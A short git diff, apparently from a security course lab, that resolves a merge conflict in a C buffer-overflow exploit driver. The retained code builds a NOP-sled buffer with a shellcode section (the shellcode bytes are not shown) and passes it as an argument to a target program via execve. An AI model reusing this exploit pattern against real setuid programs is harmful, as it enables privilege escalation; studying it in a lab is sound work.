@@ -11,9 +11,8 @@ int main(void)
   char *args[3];
   char *env[1];
 
-<<<<<<< HEAD
   char instructions[201];
-
+  
   // NOP instructions
   memset(instructions, '\x90', 201);
   // shellcode
@@ -24,9 +23,6 @@ int main(void)
   strncpy(instructions+200, "\x90", 1);
 
   args[0] = TARGET; args[1] = instructions; args[2] = NULL;
-=======
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
->>>>>>> efd7014833d593a7cf07e6e7e93f60b1c1930010
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
